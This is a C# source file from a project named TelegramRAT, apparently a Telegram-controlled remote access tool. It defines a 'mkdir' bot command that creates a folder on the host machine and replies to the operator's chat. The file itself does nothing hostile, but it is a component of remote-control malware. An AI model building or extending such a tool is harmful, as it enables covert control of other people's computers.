using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class MkdirCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "mkdir";
    public override string[] Aliases => new[] { "md", "createfolder", "makedir", "createdir" };
    public override string Description => "Create directory.";
    public override string Example => "/mkdir C:\\Users\\User\\Documents\\NewFolder";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var targetDirectory = fileSystemService.SanitizePath(model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty));

            if (!fileSystemService.DirectoryExists(targetDirectory))
            {
                fileSystemService.CreateDirectory(targetDirectory);
                await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
            else
            {
                await botClient.SendMessage(model.Message.Chat.Id, "This folder already exists!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
        }
        catch (Exception e)
        {
            await notificationService.ReportExceptionAsync(model.Message, e);
        }
    }
}
